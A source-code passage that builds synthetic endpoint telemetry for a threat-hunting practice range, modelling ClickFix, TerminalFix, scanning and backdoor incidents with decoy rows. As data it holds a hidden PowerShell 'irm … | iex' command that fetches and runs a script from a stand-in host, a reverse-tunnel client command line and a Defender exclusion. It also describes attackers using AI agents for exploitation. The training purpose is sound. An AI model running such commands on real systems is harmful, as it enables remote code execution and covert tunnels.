    // "Add-MpPreference"` sweep catches this benign row too; only an exclusion path pointed at a
    // non-standard, user-writable AppData location — never a real Program Files install path — isolates
    // the real incident, the same "the cmdlet's presence is never the signal, WHERE it points is" lesson
    // this range has taught before via folder paths (s35, s40), applied here to a command-line argument
    // instead of the process's own FolderPath.
    DeviceProcessEvents.push({
      Timestamp: iso(28), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'powershell.exe', FolderPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0',
      SHA1: hex(mulberry32(6501), 40), ProcessId: 4402,
      ProcessCommandLine: 'powershell.exe -Command "Add-MpPreference -ExclusionPath \'C:\\Program Files\\Veeam\\Backup\'"',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32',
      InitiatingProcessCommandLine: 'cmd.exe /c powershell.exe -Command "Add-MpPreference -ExclusionPath \'C:\\Program Files\\Veeam\\Backup\'"',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'svc_backup',
    });

    // ---------- Incident U: "Operation PasteSwitch" — attackers hijacked the verified u/hbomax Reddit
    // account and ran 108 malicious ads over ~48 hours, using the ClickFix social-engineering technique to
    // trick victims into pasting a malicious command into the Windows Run dialog, PowerShell, or macOS
    // Terminal while believing they're fixing an error or passing a CAPTCHA. Grounded in BleepingComputer,
    // "Hackers hijack HBO Max Reddit account to push malware in ClickFix ads" (Lawrence Abrams, published
    // Sept 14 2026, fetched and read directly), which quotes one exact macOS ClickFix command verbatim but
    // does NOT publish a captured Windows command line for the reported "Amatera Stealer" delivery — only
    // that it happens "via obfuscated PowerShell." That gap is deliberately NOT invented as if it were a
    // captured IOC.
    //   The exact Windows execution-chain and obfuscated-syntax shape modeled here (explorer.exe spawning
    //   powershell.exe directly, using the iwr/irm/iex alias chain) instead comes from Microsoft's own
    //   canonical reference on this technique: "Think before you ClickFix: Analyzing the ClickFix social
    //   engineering technique" (microsoft.com/en-us/security/blog/2025/08/21/..., fetched and read directly
    //   this round to confirm), which documents explorer.exe — via the Run dialog, using ShellExecute/
    //   CreateProcess APIs — as the real, anomalous parent that launches the malicious child directly
    //   (NOT the ordinary cmd.exe->powershell.exe chain a legitimate script launch would show), and
    //   documents obfuscated PowerShell commonly chaining the iwr/irm/iex cmdlet aliases
    //   (Invoke-WebRequest/Invoke-RestMethod/Invoke-Expression) as the payload shape. Microsoft's own post
    //   recommends hunting via DeviceRegistryEvents (the RunMRU key) — a table this practice range doesn't
    //   have — so this mission instead hunts the DeviceProcessEvents-table signal that same post equally
    //   documents: the anomalous parent process plus the obfuscated command-line content. This is the same
    //   disclosed-simplification policy this range has used whenever a current report names a mechanism
    //   without a captured command line for THIS specific campaign (s34/ShieldBreak, s35/REVSTEALER, s39's
    //   schtasks syntax, s42's Add-MpPreference syntax) — restated in the mission's own dispositionWhy text
    //   below, not just here.
    //   MITRE ATT&CK T1204.004 (User Execution: Malicious Copy and Paste) — fetched and confirmed directly
    //   against attack.mitre.org/techniques/T1204/004/ before use; its own procedure-examples table names
    //   Contagious Interview, Havoc, Kali365, Kimsuky, and MuddyWater all using ClickFix-style copy-paste
    //   social engineering — none of them is claimed to be behind the HBO Max campaign specifically.
    //   Genuinely new to this range (never used in s1-s42); maps to the Execution tactic, which T1059.001
    //   (alert-a1) and T1053.005 (Incident Q) already light up, so this adds technique diversity but not a
    //   new coverage-heatmap square — confirmed by checking TECHNIQUE_TACTIC in app.js before writing this
    //   comment, not assumed.
    //   No new device added to DEVICES — FAB-HR-05 (lchen) and FAB-ENG-03 (dkoval) both already exist,
    //   avoiding the s9 busiest-device regression class every incident since K has worked around (both
    //   devices sit well below FAB-FIN-04's 48 even after this round's 2 new rows — confirmed with the Node
    //   harness below, not assumed). The obfuscated iwr/irm/iex chain and the fictional CAPTCHA-lure domain
    //   live only inside ProcessCommandLine, never FolderPath, so this cannot collide with s14's
    //   FolderPath-scoped Temp/Roaming sweep — also confirmed concretely below. The fictional lure domain
    //   uses the .example TLD convention this range already uses for invented domains representing a real
    //   pattern (Incident A's invoice-alerts-secure.example, Incident G's finance-lure domains) rather than
    //   reusing the real reported IOC domains (ember-bridge[.]com, hbomaxx[.]us, etc.) verbatim as if
    //   captured in this synthetic dataset. ----------
    const cfBase = iso(5.25); // ~5h15m ago
    DeviceProcessEvents.push({
      Timestamp: cfBase, DeviceName: 'FAB-HR-05', ActionType: 'ProcessCreated',
      FileName: 'powershell.exe', FolderPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0',
      SHA1: hex(mulberry32(6600), 40), ProcessId: 7734,
      ProcessCommandLine: 'powershell.exe -WindowStyle Hidden -NoProfile -Command "irm https://secure-captcha-verify.example/init.ps1 | iex"',
      AccountDomain: 'FABRIKAM', AccountName: 'lchen',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'lchen',
    });
    // Decoy: the SAME explorer.exe -> powershell.exe parent-child pattern, but for an ordinary,
    // non-malicious reason — an employee launching a personal automation script via the Run dialog, with a
    // normal, non-obfuscated command line and no suspicious domain, at an unrelated time on a different
    // device. Teaches that the parent-child pattern alone isn't the signal (a naive
    // InitiatingProcessFileName == "explorer.exe" and FileName == "powershell.exe" sweep catches this row
    // too); only the obfuscated iwr/irm/iex-chained content isolates the real incident.
    DeviceProcessEvents.push({
      Timestamp: iso(37), DeviceName: 'FAB-ENG-03', ActionType: 'ProcessCreated',
      FileName: 'powershell.exe', FolderPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0',
      SHA1: hex(mulberry32(6601), 40), ProcessId: 5518,
      ProcessCommandLine: 'powershell.exe -File C:\\Users\\dkoval\\Scripts\\organize-downloads.ps1',
      AccountDomain: 'FABRIKAM', AccountName: 'dkoval',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'dkoval',
    });

    // ---------- Incident V: AI-orchestrated active scanning against Fabrikam's own exposed IT
    // management server — grounded in Hunt.io, "Chinese-Speaking Operator Uses AI Agents to Target
    // Government and Education Systems Across Asia" (published Sept 3, 2026,
    // hunt.io/blog/chinese-operator-secflow-claude-qwen-deepseek-asia, fetched and read directly;
    // resurfaced in TheHackerNews' Sept 16, 2026 "ThreatsDay" roundup, which is why it's in today's
    // briefing despite the underlying research predating it by 13 days). Hunt.io documents a
    // Chinese-speaking operator, tracked only by the infrastructure/build-path/proxy-credential handle
    // "Nie" (no formal MITRE group designation), running an AI-orchestration framework the operator
    // calls SecFlow that converts campaign objectives into tasks for specialized AI agents (Claude ACP
    // via a private relay, Qwen Code via Alibaba DashScope, DeepSeek v4-Pro), automating
    // reconnaissance-through-exploitation against government/education/telecom targets across Taiwan,
    // Indonesia, Vietnam, mainland China, and Afghanistan. The report names a broad set of known CVEs
    // the operator's tooling exploits across different exposed services, each on its own distinctive,
    // independently-verified default port — Grafana path traversal (CVE-2021-43798, default port 3000
    // — confirmed via Grafana Labs' own community documentation), Nexus Repository Manager path
    // traversal (CVE-2024-4956, default port 8081 — confirmed via independent port-reference
    // documentation), Apache Tomcat AJP "Ghostcat" file-inclusion (CVE-2020-1938, AJP connector default
    // port 8009 — confirmed via Tenable's own CVE write-up), and Nacos authentication bypass
    // (CVE-2021-29441, default port 8848 — confirmed via Nacos's own official deployment-overview docs)
    // — alongside Shellshock, Spring4Shell, Shiro deserialization, and Log4Shell, which ride ordinary
    // HTTP(S) ports and so have no distinctive port of their own. Hunt.io's own MITRE ATT&CK mapping for
    // this campaign names T1595 (Active Scanning) among its listed techniques (also T1190, T1078,
    // T1090, T1003, T1552.001, T1505.003, T1105, T1213, T1567).
    //   MITRE ATT&CK T1595 (Active Scanning) — Reconnaissance tactic (TA0043) — fetched and read
    //   directly from attack.mitre.org/techniques/T1595/ before use. Genuinely new to this range: no
    //   prior scenario has ever used a Reconnaissance-tactic technique, and no earlier mission has ever
    //   lit up that tactic on the coverage heatmap — confirmed by checking the live TECHNIQUE_TACTIC
    //   table and the Reconnaissance entry in TACTICS before writing this comment, not assumed. T1595's
    //   own procedure-examples table lists exactly one entry (C0030/G0088, the Triton Safety
    //   Instrumented System campaign / TEMP.Veles, "network reconnaissance activities targeting
    //   infrastructure of interest") — real precedent for the technique in general, but NOT a claim that
    //   TEMP.Veles is connected to SecFlow/"Nie" in any way; the two campaigns are unrelated.
    //   What is NOT claimed as fact: Hunt.io's report does not publish a literal packet-level "scan
    //   burst" telemetry table for this campaign (no captured list of exact ports probed in what time
    //   window from what source) — it describes the actor exploiting already-identified vulnerable
    //   services across the named products/ports above, and separately lists T1595 as a technique used.
    //   The specific ports, timing, and source/target addresses modeled below are therefore a disclosed,
    //   illustrative modeling choice grounded in (a) T1595's own real definition ("probing victim
    //   infrastructure... to gather information... including scanning for open ports/services") and (b)
    //   the campaign's own documented target-service list above, not a captured IOC — restated in this
    //   mission's own dispositionWhy text, the same disclosed-simplification policy this range has used
    //   whenever a source names a technique/mechanism without a captured command line or telemetry table
    //   (s34/ShieldBreak, s35/REVSTEALER, s39's schtasks syntax, s42's Add-MpPreference syntax, s43's
    //   ClickFix Windows chain). Real attacker infrastructure Hunt.io names (81.70.240.170,
    //   43.99.61.170, 152.42.200.25, 129.211.184.149, 159.223.64.67, SOCKS proxies, *.niestools.com) is
    //   NOT reused here — per this range's standing policy, fictional externals use RFC 5737
    //   documentation ranges instead.
    //   Modeled here as FAB-IT-01 (already this range's internet-facing IT/management server — see
    //   Incident K's PaperCut chain) having been pivoted through to continue the campaign's active
    //   scanning against a further downstream target, rather than as inbound scan traffic hitting
    //   Fabrikam directly — DeviceNetworkEvents in this range, like every real event modeled so far
    //   (e.g. Incident B/D's SMB lateral-movement hop), is process-initiated, outbound-framed telemetry
    //   (RemoteIP/RemotePort name the destination being connected to), so this keeps
    //   ActionType == "ConnectionSuccess" consistent with every other row in this dataset rather than
    //   inventing an unverified inbound-specific ActionType value that Microsoft's own reference page
    //   doesn't enumerate. No new device added to DEVICES (avoiding the s9 busiest-device regression
    //   class every incident since K has worked around) — confirmed with the Node harness, not assumed;
    //   this incident also never touches DeviceProcessEvents at all, so it cannot affect s9 regardless.
    //   Decoy: Fabrikam's own IT department already runs a routine, authorized internal vulnerability
    //   scan from FAB-IT-01/svc_backup (the same account already established running IT/backup
    //   operations on this device across multiple earlier incidents) — a broad, generic sweep of common
    //   service ports against an internal host, the single best-known real-world false-positive source
    //   for any naive "many distinct ports from one source" detection. The teaching point, verified
    //   programmatically below: raw port fan-out alone isn't the signal — a naive
    //   `summarize dcount(RemotePort) by RemoteIP` sweep (no port filter) catches both the malicious
    //   burst AND this authorized scan; only filtering to the campaign's own specific,
    //   thematically-grounded exploited-service ports (3000/8009/8081/8848) before aggregating isolates
    //   the real incident — a genuinely new `summarize dcount()` aggregation shape for this range's
    //   "anomalous network activity" missions (s10/s28 taught literal string/URL matching instead).
    //   None of the ports used here (3000, 8009, 8081, 8848, and the decoy's 21/22/80/443/1433/3306/
    //   3389/5432) collide with s16's `RemotePort == 445` SMB-lateral-movement mission — confirmed
    //   deliberately, since port 445 is the one existing DeviceNetworkEvents value this range grades on
    //   precisely. ----------
    const vBase = iso(2.75); // ~2h45m ago
    [3000, 8009, 8081, 8848].forEach((port, idx) => {
      DeviceNetworkEvents.push({
        Timestamp: new Date(vBase.getTime() + idx * 6000), DeviceName: 'FAB-IT-01', ActionType: 'ConnectionSuccess',
        RemoteIP: '203.0.113.87', RemotePort: port, Protocol: 'Tcp',
      });
    });
    // Decoy: Fabrikam's own authorized internal vulnerability-scanning service (svc_backup, already the
    // established IT/service account on FAB-IT-01) sweeping a broad, generic range of common service
    // ports against an internal host — none of which overlap the campaign's 4 specific ports above, and
    // none of which is port 445 (the one port this range's s16 mission grades on precisely).
    [21, 22, 80, 443, 1433, 3306, 3389, 5432].forEach((port, idx) => {
      DeviceNetworkEvents.push({
        Timestamp: new Date(vBase.getTime() + 3600000 + idx * 4000), DeviceName: 'FAB-IT-01', ActionType: 'ConnectionSuccess',
        RemoteIP: '10.20.0.60', RemotePort: port, Protocol: 'Tcp',
        InitiatingProcessFileName: 'vulnscan-agent.exe', InitiatingProcessAccountName: 'svc_backup',
      });
    });

    // ---------- Incident W: "TerminalFix" — a ClickFix-variant campaign Microsoft Security Blog
    // documented in "TerminalFix campaign deploys a reverse tunnel through multistage intrusion"
    // (microsoft.com/en-us/security/blog/2026/08/28/terminalfix-campaign-deploys-reverse-tunnel-
    // through-multistage-intrusion/, published Aug 28 2026, fetched and read directly this round),
    // resurfaced this week via a German BSI government warning (Sept 4) and press coverage (DIESEC,
    // TechRadar, Dark Reading) after hitting a German state institution and the Berlin Senate.
    //   Full chain per Microsoft's own post: a fake Cloudflare Turnstile CAPTCHA overlay on a
    //   compromised site tells the victim to paste a command into Windows Terminal/PowerShell
    //   ("Starting Cloudflare verification..."); that PowerShell downloads a ZIP extracted to a
    //   hex-named ProgramData folder, launches 1.bat, which silently runs LockScreenContentServer.exe
    //   (a legitimate signed Windows binary) — which then sideloads a malicious dui70.dll from that
    //   same folder instead of the real System32 copy (classic DLL side-loading); steganographic
    //   payload extraction and Run-key/hourly-scheduled-task persistence follow; finally, a Python
    //   3.14.5 embeddable runtime downloaded straight from python.org is used to run pythonw.exe
    //   (no window) executing client.py, opening a TLS WebSocket reverse tunnel to the attacker's
    //   relay on port 443. Microsoft's own post gives four hunting queries for this exact chain; this
    //   mission is built directly around the third one, verbatim except for the fictional domain:
    //     DeviceProcessEvents
    //     | where FileName in~ ("pythonw.exe", "python.exe")
    //     | where ProcessCommandLine has_all ("client.py", "--server", "--uuid", "cert.pem", "gitnow.dev")
    //   — a real, unmodified Python interpreter used AS the tunnel client, not a custom binary, so
    //   neither the file name nor its presence alone is suspicious; only the specific combination of
    //   required tunnel-client arguments together is.
    //   DISCLOSED — engine adaptation of Microsoft's own query syntax: Microsoft's real query uses
    //   `has_all ("client.py", "--server", "--uuid", "cert.pem", "gitnow.dev")`, but this range's
    //   `has`/`has_all` implementation (see kql-engine.js's `isTermMatch` — "approximate `has` term
    //   semantics: word-boundary match on alnum runs") only matches whole alphanumeric runs, so a
    //   needle containing punctuation like "--server" or "cert.pem" never matches here (confirmed
    //   directly against the Node harness before shipping — a documented, disclosed engine-simplification
    //   gap, not a bug introduced by this mission). s45's solutionQuery below therefore chains
    //   `contains` (plain substring matching, which handles punctuation correctly) instead of `has_all`
    //   for the punctuation-bearing arguments, while keeping Microsoft's `in~` file-name check verbatim
    //   — same required-argument-combination lesson, adapted to what this engine actually implements
    //   correctly, exactly the policy the cheat sheet's own "not supported here" note exists for.
    //   DISCLOSED — attribution is separately sourced, not Microsoft's own claim: Microsoft's post does
    //   NOT name a threat-actor group behind TerminalFix, only the campaign itself (confirmed by
    //   independent re-fetch of the post this round: "Microsoft's analysis does not attribute this
    //   campaign to a specific named threat actor"). A SEPARATE tracker, CrowdStrike, links this
    //   activity cluster to what it calls Vice Spider (aka Rhysida/Vanilla Tempest/InterLock) — a
    //   financially-motivated actor that operates Rhysida and Interlock ransomware. That link is
    //   reported here as background context from a different, named source, never conflated with
    //   Microsoft's own post as if Microsoft made the attribution itself.
    //   DISCLOSED — engine/schema gap: Microsoft's second hunting query (DeviceImageLoadEvents, the
    //   dui70.dll sideload-detection step) targets a table this range doesn't implement — the same
    //   class of documented gap as the missing DeviceRegistryEvents table noted for s43's ClickFix
    //   round. The fake-CAPTCHA lure, the ProgramData/1.bat/LockScreenContentServer.exe launch chain,
    //   and the dui70.dll sideload are real, Microsoft-documented stages of THIS campaign, told as
    //   prompt-only background narrative rather than invented as queryable rows this range has no
    //   table for — same policy as every prior round's disclosed-simplification precedent (s34, s35,
    //   s39, s42, s43). This mission is built entirely around the one stage that DOES map onto a table
    //   this range supports end to end: the reverse-tunnel launch, on DeviceProcessEvents.
    //   Fictional domain: gitsync-relay.example (RFC-2606-style .example TLD standing in for the real
    //   reported gitnow.dev, representing the pattern rather than reusing Microsoft's real reported
    //   C2 domain verbatim in this synthetic dataset — same convention as Incident A's
    //   invoice-alerts-secure.example and Incident U/s43's secure-captcha-verify.example). The
    //   ProgramData folder's hex segment and the tunnel UUID are both freshly generated via this
    //   dataset's own seeded RNG, not Microsoft's real captured example value (f47f2a8c21c9df4e).
    //   MITRE ATT&CK T1572 (Protocol Tunneling) — fetched and confirmed directly against
    //   attack.mitre.org/techniques/T1572/ before use: technique name "Protocol Tunneling," tactic
    //   "Command and Control." Genuinely new to this range (never used in s1-s44) — but Command and
    //   Control was already lit up on the coverage heatmap by T1219 and T1090.002 (both checked against
    //   the live TECHNIQUE_TACTIC table below before writing this comment, not assumed), so this adds
    //   technique diversity but does NOT light up a new heatmap square — the same situation T1574.001/
    //   T1003.001/T1204.004 were each in previously.
    //   No new device added to DEVICES (avoiding the s9 busiest-device regression class every incident
    //   since K has worked around) — FAB-FIN-11 (rpatel) already exists (its only prior
    //   DeviceProcessEvents row is Incident N's SYSTEM-context malicious row; rpatel, the device's own
    //   named user, has never appeared in an incident before this round). Decoy lives on FAB-ENG-08
    //   (ssingh), also already an existing device (Incident F). ----------
    const twBase = iso(1.25); // ~1h15m ago
    const twFolderHex = hex(mulberry32(6700), 16);
    const twUuid = hex(mulberry32(6702), 32);
    DeviceProcessEvents.push({
      Timestamp: twBase, DeviceName: 'FAB-FIN-11', ActionType: 'ProcessCreated',
      FileName: 'pythonw.exe', FolderPath: 'C:\\ProgramData\\' + twFolderHex + '\\Python311',
      SHA1: hex(mulberry32(6701), 40), ProcessId: 8845,
      ProcessCommandLine: 'pythonw.exe client.py --server gitsync-relay.example --uuid ' + twUuid + ' cert.pem',
      AccountDomain: 'FABRIKAM', AccountName: 'rpatel',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32',
      InitiatingProcessCommandLine: 'cmd.exe /c pythonw.exe client.py --server gitsync-relay.example --uuid ' + twUuid + ' cert.pem',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'rpatel',
    });
    // Decoy: the SAME family of binary — python.exe rather than pythonw.exe, but the naive
    // `FileName in~ ("pythonw.exe", "python.exe")` sweep alone still catches it — running a completely
    // ordinary, non-malicious data-pipeline automation script, from Python's own real, standard
    // Program Files install location, on an unrelated device/time. Its command line carries none of
    // the required tunnel-client arguments (no client.py, no --server/--uuid/cert.pem), so the
    // `has_all` filter excludes it — the same "the interpreter's own name is never the signal, the
    // specific required argument set together is" lesson this range has taught before via folder
    // paths and command-line content (s35, s40, s42, s43), applied here to a legitimate scripting
    // runtime instead of a Windows LOLBin.
    DeviceProcessEvents.push({
      Timestamp: iso(50), DeviceName: 'FAB-ENG-08', ActionType: 'ProcessCreated',
      FileName: 'python.exe', FolderPath: 'C:\\Program Files\\Python311',
      SHA1: hex(mulberry32(6703), 40), ProcessId: 4471,
      ProcessCommandLine: 'python.exe etl_daily_sync.py --input C:\\Data\\daily_export.csv --output C:\\Reports\\summary.csv',
      AccountDomain: 'FABRIKAM', AccountName: 'ssingh',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32',
      InitiatingProcessCommandLine: 'cmd.exe /c python.exe etl_daily_sync.py --input C:\\Data\\daily_export.csv --output C:\\Reports\\summary.csv',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'ssingh',
    });

    // ---------- Incident X: FamousSparrow deploys the "SparroWocky" backdoor across Latin American
    // government targets via DLL side-loading — grounded in TheHackerNews, "China-Aligned FamousSparrow
    // Deploys SparroWocky Backdoor Across Latin America" (published Sept 17, 2026,
    // thehackernews.com/2026/09/china-aligned-famoussparrow-deploys.html, reporting on ESET researchers
    // Alexandre Côté Cyr and Romain Dumont, fetched and read directly this round).
    //   FamousSparrow (a China-aligned, state-sponsored espionage group) is reported deploying a new C++
    //   modular backdoor, SparroWocky, against government entities across Argentina, Ecuador, Guatemala,
    //   Honduras, Panama, Peru, Puerto Rico, and Venezuela — a campaign active since at least August 2025,
    //   with focused Latin America targeting since July 2025. The reported delivery mechanism is DLL
    //   side-loading: a legitimate executable launches a loader DLL that decrypts and loads the main
    //   SparroWocky payload. The backdoor talks TLS-encrypted (Mbed TLS) C2 to a reported IP,
    //   216.238.110[.]120, and its reported capabilities include executing arbitrary files, acting as a
    //   TCP proxy, running commands, collecting machine/network info, exfiltrating files, capturing
    //   screenshots, and self-deleting.
    //   MITRE ATT&CK CORRECTION MADE THIS ROUND, per this project's no-guessing rule: the technique this
    //   story was originally scoped against, "T1574.002 (DLL Side-Loading)", NO LONGER EXISTS as a live
    //   MITRE ATT&CK sub-technique — verified directly by fetching attack.mitre.org/techniques/T1574/002/,
    //   which 301-redirects (a real server-side redirect from MITRE's own site, not a proxy artifact) to
    //   attack.mitre.org/techniques/T1574/001/, and by fetching the T1574 parent page's own sub-technique
    //   table, which lists .001/.004/.005/.006/.007/.008/.009/.010 — no .002 at all. T1574.001's own page
    //   title is "Hijack Execution Flow: DLL," and its description explicitly folds in "DLL Sideloading"
    //   as one of its own named sub-behaviors (alongside search-order hijacking and phantom DLL
    //   hijacking) — MITRE evidently merged the former standalone DLL-Side-Loading sub-technique into
    //   T1574.001 at some past ATT&CK revision, consistent with this range's own s40/Incident R code
    //   comment ("T1574.001 ... formerly 'DLL Search Order Hijacking'"). This mission therefore uses the
    //   real, current, MITRE-verified ID, T1574.001 — NOT the deprecated T1574.002 — even though that
    //   means this is a repeat of the technique s40/GRAYRABBIT already used (both tactics it maps to,
    //   Stealth and Execution, were already lit up by that and other earlier missions, so this doesn't add
    //   a new coverage-heatmap square, the same situation T1090.002/T1572 were each in previously) — a
    //   real technique-ID correction caught by verifying independently rather than trusting the
    //   pre-supplied research brief at face value.
    //   What is NOT claimed as fact: the article names neither the specific legitimate executable nor the
    //   loader DLL's filename in the side-loading chain — only the mechanism itself. This mission's process
    //   name (AppUpdater.exe) and its non-standard cache folder are therefore a disclosed, illustrative
    //   modeling choice representing "a legitimate executable side-loading a malicious DLL," not a
    //   captured IOC — the same disclosed-simplification policy used for s34/ShieldBreak, s35/REVSTEALER,
    //   and s39/s40/s42/s43/s45's own syntax/naming gaps.
    //   The reported C2 IP (216.238.110.120) is a real, disclosed indicator — but per this range's
    //   consistent, standing convention (checked against every prior round's C2/proxy IP: Incident A's
    //   203.0.113.55, Incident F's 198.51.100.77 mining pool, Incident O's 203.0.113.212 proxy, Incident
    //   V's 203.0.113.87 scan target, and the Sangoma Switchvox real C2 command explicitly NOT reused
    //   verbatim in the 2026-09-10 round) — every fictional/malicious external address in this synthetic
    //   dataset is modeled with an RFC 5737 documentation-range address instead of the real reported one,
    //   even when the real one is itself safe to print. This mission follows that same convention rather
    //   than treating this one differently: 198.51.100.130 (RFC 5737 TEST-NET-2, an octet not already used
    //   by Incidents B/F/H/I) stands in for 216.238.110.120, disclosed here and in the mission's own
    //   dispositionWhy text.
    //   No new device added to DEVICES (avoiding the s9 busiest-device regression class every incident
    //   since K has worked around) — FAB-HR-02 (agomez) already exists (used so far only for Incident K's
    //   decoy row and s41's LSASS-dump incident), and this is this range's first DeviceProcessEvents
    //   *malicious* row on that device. The non-standard cache folder contains neither "Temp" nor
    //   "Roaming", so it cannot collide with s14's FolderPath-scoped sweep, and the C2 port (443) doesn't
    //   collide with s16's port-445 SMB mission or s44's 3000/8009/8081/8848 scanning-burst mission —
    //   confirmed with the Node harness below, not assumed. ----------
    const fsBase = iso(4.25); // ~4h15m ago
    const FS_C2_IP = '198.51.100.130';
    DeviceProcessEvents.push({
      Timestamp: fsBase, DeviceName: 'FAB-HR-02', ActionType: 'ProcessCreated',
      FileName: 'AppUpdater.exe', FolderPath: 'C:\\Users\\agomez\\AppData\\Local\\AppUpdaterCache',
      SHA1: hex(mulberry32(6800), 40), ProcessId: 6612,
      ProcessCommandLine: 'AppUpdater.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'agomez',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'agomez',
    });
    DeviceNetworkEvents.push({
      Timestamp: new Date(fsBase.getTime() + 45000), DeviceName: 'FAB-HR-02', ActionType: 'ConnectionSuccess',
      RemoteIP: FS_C2_IP, RemotePort: 443, Protocol: 'Tcp',
      InitiatingProcessFileName: 'AppUpdater.exe', InitiatingProcessAccountName: 'agomez',
    });
    // Decoy: the SAME AppUpdater.exe binary, but the REAL, legitimate updater — running from its genuine
    // Program Files install location, on an unrelated device/account/time. A naive
    // `FileName == "AppUpdater.exe"` sweep catches this benign row too (2 total); only the folder-path
    // mismatch isolates the real incident to exactly 1 — the same "the tool's name is never the signal"
    // lesson as s33/s35/s39/s40/s42, applied here to a fresh, previously-unused illustrative process name.
    DeviceProcessEvents.push({
      Timestamp: iso(33), DeviceName: 'FAB-ENG-01', ActionType: 'ProcessCreated',
      FileName: 'AppUpdater.exe', FolderPath: 'C:\\Program Files\\AppUpdater',
      SHA1: hex(mulberry32(6801), 40), ProcessId: 4090,
      ProcessCommandLine: 'AppUpdater.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'tnowak',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'tnowak',
    });

    // ---------- Incident Y: the Iran-linked "Handala" hacktivist persona (operated by Void Manticore,
    // assessed Iran MOIS-affiliated) deploying the HEAVYGRAM Telegram-based backdoor — grounded in
    // Group-IB's research reported via TheHackerNews, "Iran-Linked Handala Hack Tied to HEAVYGRAM
    // Telegram Backdoor That Can Steal Passwords" (published Sept 17, 2026, fetched and read directly
    // this round), corroborated by a joint UK NCSC / US FBI / Dutch advisory published ~Sept 15-16, 2026
    // on the same underlying malware family.
    //   TWO NAMES, ONE CAMPAIGN — disclosed explicitly, same treatment as the ShieldBreak (s34)
    //   CVE-numbering disagreement: Group-IB's own reporting names the backdoor HEAVYGRAM and a paired
    //   Delphi defense-evasion utility CRUDEEXCLUDE, both attributed to Handala operators. The UK's
    //   independent tracking name for the same underlying malware family, per the joint NCSC/FBI/Dutch
    //   advisory, is CHOSEN BRICK. Both names are cited here, side by side, as referring to the SAME
    //   campaign rather than two separate ones — not silently picked between, the same policy this range
    //   has used for every other cross-source naming disagreement.
    //   REGISTRY PERSISTENCE — confirmed technical indicator, MITRE-verified before use: both sources
    //   report persistence via HKCU\Software\Microsoft\Windows\CurrentVersion\Run — a real, standard
    //   Windows Run key. MITRE ATT&CK T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys /
    //   Startup Folder) — fetched and confirmed directly against attack.mitre.org/techniques/T1547/001/
    //   before use this round; tactics Persistence + Privilege Escalation, per that page's own tactic
    //   list. Genuinely new to this range (never used in s1-s46).
    //   TWO NAMED REGISTRY-VALUE -> DROPPED-FILE PAIRS reported: value name "SMQDService" pointing at
    //   C:\ProgramData\SMQDServicePackages\...\smdqservice.exe, and value name "winappx" pointing at
    //   C:\Users\All Users\MicrosoftDistribution\sysmain\winappx.exe. Both dropped-file paths are real,
    //   reported indicators (non-standard, user/world-writable locations impersonating legitimate-
    //   sounding Windows/service names) — used here verbatim, since this project's RFC-5737-only
    //   fictionalization convention applies specifically to external IPs/domains, not to internal
    //   filesystem paths, which this range has always reused directly from source reporting when known
    //   (e.g. s33's C:\Program Files\PaperCut MF\server\bin\win, s38's vssadmin.exe command line).
    //   DISCLOSED ENGINE/SCHEMA GAP: this range's engine has no DeviceRegistryEvents table (a known,
    //   deliberately-unaddressed gap — see the Roadmap section of this project's notes), so the registry
    //   value write itself (HKCU\...\Run\winappx -> the dropped-file path) cannot be modeled as a
    //   queryable row. This mission instead hunts the DOWNSTREAM signal that table gap still leaves
    //   visible: the malicious process itself running from that exact non-standard, reported path — a
    //   DeviceProcessEvents row. This is the SAME disclosed-simplification policy s43 used for the
    //   ClickFix/RunMRU registry gap (Microsoft's own post recommended hunting the RunMRU key, a table
    //   this range doesn't have, so s43 hunted the DeviceProcessEvents-table signal that same post
    //   equally documented instead) — restated explicitly here and in this mission's own dispositionWhy
    //   text, not left to a code comment alone.
    //   NOT MODELED (prompt-only background, no queryable row invented): delivery via WhatsApp/Telegram
    //   disguised as legitimate apps (Pictory, RunwayML, Norton Antivirus, Adobe Flash Player, KeePass)
    //   or fake MRI-scan-result medical documents; Defender-exclusion defense evasion (the same T1562.001
    //   family s42 already used — deliberately NOT re-encoded as a second graded row here, to keep this
    //   mission focused on the genuinely new T1547.001 angle rather than scope-creeping into a repeat);
    //   the Telegram-bot-API C2 channel (one bot per victim ID) and the abused-legitimate-cloud-service
    //   exfil paths (VultrObjects, StorjShare) and proxy services (iproyal.com, lightningproxies.net) —
    //   all real, currently-in-use LEGITIMATE third-party services being abused, not attacker-registered
    //   infrastructure, so this range's standing "fictionalize the reported C2 IP/domain" convention
    //   doesn't strictly apply the same way to them; rather than invent a queryable network row for a
    //   legitimate service this range has no clean way to distinguish from ordinary legitimate traffic to
    //   that same service, the safer, more conservative choice was taken: leave this stage as prompt-only
    //   narrative color, consistent with how this range has always preferred an honest gap over an
    //   invented row when a mechanism doesn't map cleanly onto a table it implements (e.g. s33's
    //   account-creation stage, s35's unreported miner binary, s45's DeviceImageLoadEvents-only DLL-
    //   sideload-detection stage).
    //   New Incident Y: winappx.exe (folder C:\Users\All Users\MicrosoftDistribution\sysmain — the real,
    //   reported dropped-file location, NOT the folder a genuine Windows "sysmain" service would ever run
    //   from) launched by explorer.exe — the real, documented mechanism by which a HKCU Run-key entry
    //   executes at every logon, the shell process itself, not a spawned installer chain — under account
    //   mrivera on the existing device FAB-MKT-02 (no new device added to DEVICES — same s9-regression-
    //   avoidance policy as every incident since K; FAB-MKT-02 already exists, hosting only Incident R's
